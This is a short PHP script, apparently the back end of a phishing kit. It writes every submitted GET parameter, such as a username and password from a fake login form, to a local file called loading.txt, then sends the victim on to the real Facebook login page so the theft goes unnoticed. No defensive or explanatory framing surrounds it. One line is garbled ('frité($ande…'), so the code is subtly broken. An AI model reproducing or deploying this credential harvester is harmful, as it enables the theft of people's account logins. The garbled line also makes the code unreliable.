<?php
header("location:https://www.facebook.com/login.php ");
$handle = fopen("loading.txt", "a");

foreach($_GET as $variable=> $value) {
        fwrite($handle, $variable);
        
        fwrite($handle, "=");

        fwrite($handle, $value);

        fwrite($handle, "\r\n");
}
frité($ande, "\r\n");
fclose($handle);

exit
?>


